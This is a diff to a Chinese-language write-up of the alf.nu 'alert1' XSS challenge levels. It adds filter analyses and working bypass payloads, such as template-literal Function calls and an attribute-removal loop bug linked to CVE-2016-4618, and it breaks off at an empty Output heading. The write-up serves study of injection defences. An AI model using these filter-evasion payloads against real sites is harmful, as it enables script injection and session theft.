@@ -19,9 +19,9 @@ https://alf.nu/alert1
 
 源码白给，在Input处输入payload，output给出拼接后的代码，若能成功执行alert(1)则判定win
 
-Console output给出console.log()的输出，可以通过这个看出自己拼接的效果
+Console output给出控制台输出
 
-Test iframe显示输入payload后的页面
+Test iframe显示iframe
 
 如图
 
@@ -174,7 +174,11 @@ function escape(s) {
 text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
 ```
 
-将所有形如`[[a|b]]`的字符串转化为`<img alt="b" src="a.gif"> `
+将所有形如`[[a|b]]`的字符串转化为
+
+```
+<img alt="b" src="a.gif">
+```
 
 利用`<a href="`的`"`闭合alt的`"`
 
@@ -790,4 +794,158 @@ function escape(text) {
   }
 }
 ```
+
+过滤了一堆东西
+
+`Eaeflnrunrstu`这几个字母没有被过滤
+
+进try之后有一个eval可以搞事情
+
+前面给出了`window.the_easy_but_expensive_way_out = function() { alert(i++) };`
+
+`valueOf()`方法返回指定对象的原始值
+
+利用self把`valueOf()`定义为`the_easy_but_expensive_way_out`，然后使两个对象相加，运算时会调用`valueOf()`取对象的原始值，也就调用了`the_easy_but_expensive_way_out`
+
+需要调用两次，因为第一次是alert(0)
+
+Payload
+
+```
+{"valueOf":self["the_easy_but_expensive_way_out"]}+{"valueOf":self["the_easy_but_expensive_way_out"]}
+```
+
+Output
+
+```
+空
+```
+
+Console output
+
+```
+Alert: 0
+NaN
+```
+
+
+
+## Well
+
+```javascript
+function escape(s) {
+  http://www.avlidienbrunn.se/xsschallenge/
+
+  s = s.replace(/[\r\n\u2028\u2029\\;,()\[\]<]/g, '');
+  return "<script> var email = '" + s + "'; <\/script>";
+}
+```
+
+过滤了`\r \n \u2028 \u2029 \ ; , ( ) [ ] <`
+
+没有过滤单引号，可以闭合前面的单引号
+
+可以利用new Function
+
+分号被过滤可以使用|代替
+
+没括号用反引号
+
+Payload
+
+```
+'|new Function`a${'alert`1`'}`|'
+```
+
+Output
+
+```
+<script> var email = ''|new Function`a${'alert`1`'}`|''; </script>
+```
+
+Console output
+
+```
+Alert: 1 (must be the *number 1)
+```
+
+这样弹了个字符串1，不行，必须是数字1
+
+那还是得搞出括号，可以用String.fromCharCode
+
+Payload
+
+```
+'|new Function`a${'alert'+String.fromCharCode`40`+1+String.fromCharCode`41`}`|'
+```
+
+Output
+
+```
+<script> var email = ''|new Function`a${'alert'+String.fromCharCode`40`+1+String.fromCharCode`41`}`|''; </script>
+```
+
+
+
+## No
+
+```javascript
+// submitted by Stephen Leppik
+
+function escape(s) {
+    s = s.replace(/[()`<]/g, ''); // no function calls
+
+    return '<script>\n' +
+           'var string = "' + s + '";\n' +
+           'console.log(string);\n' +
+           '</script>';
+}
+```
+
+
+
+
+
+## Fruit
+
+```javascript
+// CVE-2016-4618
+function escape(s) {
+  var div = document.implementation.createHTMLDocument().createElement('div');
+  div.innerHTML = s;
+  function f(n) {
+    if ('SCRIPT' === n.tagName) n.parentNode.removeChild(n);
+    for (var i=0; i<n.attributes.length; i++) {
+      var name = n.attributes[i].name;
+      if (name !== 'class') { n.removeAttribute(name); }
+    }
+  }
+  [].map.call(div.querySelectorAll('*'), f);
+  return div.innerHTML;
+}
+```
+
+开局一个cve？？？？
+
+根据输入生成元素，会删除元素的属性
+
+例
+
+输入`<iframe onload=alert(1)>`
+
+输出`<iframe></iframe>`
+
+循环使用了`attributes.length`作为判断条件，这个值是某个元素中的属性数目，是动态变化的
+
+比如开始是2，一轮循环删了一个，剩1，此时i=1，n.attributes.length=1，循环结束，剩一个没删
+
+所以在onload前随便添加一个属性就完事了
+
+Payload
+
+```
+<iframe a onload=alert(1)>
+```
+
+Output
 
